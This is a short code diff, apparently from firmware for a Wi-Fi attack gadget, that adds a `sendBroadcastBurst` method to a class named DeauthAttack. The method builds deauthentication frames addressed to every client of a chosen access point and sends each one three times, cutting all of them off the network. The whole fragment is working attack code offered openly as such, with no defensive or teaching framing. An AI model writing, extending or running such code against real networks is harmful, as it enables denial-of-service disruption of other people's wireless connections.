@@ -85,6 +85,15 @@ static void deauthTaskFn(void* p) {
 DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
     : displayManager(displayManager), wifiFunctions(wifiFunctions) {}
 
+void DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
+    uint8_t frame[26];
+    volatile uint32_t ok = 0, fail = 0;
+    buildFrame(frame, BROADCAST, bssid, bssid, false);
+    sendFrame3x(frame, ok, fail);
+    buildFrame(frame, BROADCAST, bssid, bssid, true);
+    sendFrame3x(frame, ok, fail);
+}
+
 bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
     if (!str || strlen(str) < 17) return false;
     return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
